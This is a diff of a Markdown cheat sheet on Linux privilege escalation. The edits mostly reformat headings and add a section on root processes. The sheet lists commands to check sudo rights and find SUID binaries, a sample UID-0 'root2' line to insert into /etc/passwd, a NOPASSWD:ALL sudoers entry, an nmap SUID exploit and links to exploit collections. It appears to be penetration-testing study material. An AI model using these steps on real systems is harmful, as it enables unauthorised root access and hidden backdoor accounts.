@@ -1,15 +1,17 @@
 # Linux Privilege Escalation
-## Does the User have SUDO permissions?
-Check Sudo Access  
+
+
+#### Check Sudo Access  
 `sudo -l`
 
-## Any writable "system" files?
+#### Check for writable "system" files or paths?
 ```
 /etc/passwd
 /etc/shadow
 /etc/crontab
 ```
-## Creating password hashes for /etc/passwd  or /etc/shadow
+## Modifying /etc/password | /etc/shadow
+#### Creating password hashes for /etc/passwd  or /etc/shadow
  
   ```
   openssl passwd -6 -salt xyz  yourpass
@@ -17,22 +19,22 @@ Check Sudo Access
   -5 SHA256
   -6 SHA512
   ```  
-## Sample root2:testing user for /etc/passwd
+#### Sample root2:testing user for /etc/passwd
   ```
   root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
   ```
-## Adding user to suoders file
+#### Adding user to suoders file
 ```
 user     ALL=(ALL:ALL) NOPASSWD:ALL
 ``` 
 ## SUID Based Privilge Escalation  
-### Locating SUIDS
+#### Locating SUIDS
 `find . -perm /4000 2>/dev/null`  
 `find / -user root -perm -4000 -print 2>/dev/null`  
 `find / -perm -u=s -type f 2>/dev/null`  
 `find / -user root -perm -4000 -exec ls -ldb {} \;`  
 
-### Exploiting SUIDs
+#### Exploiting SUIDs
 
 nmap 2.02 - 5.21  
 `nmap -V #version check`  
@@ -68,6 +70,13 @@ less /etc/passwd
 **Command reference for privilege escalation using SUIDS and SUDO**  
 https://gtfobins.github.io/
 
+
+
+## Processes running as root
+```
+ps aux | grep root
+```
+[pspy](https://github.com/DominicBreuker/pspy) may also be used to watch system processes interaction in realtime (including command lines).
+
 ## Kernel Exploits  
 https://github.com/lucyoa/kernel-exploits
-
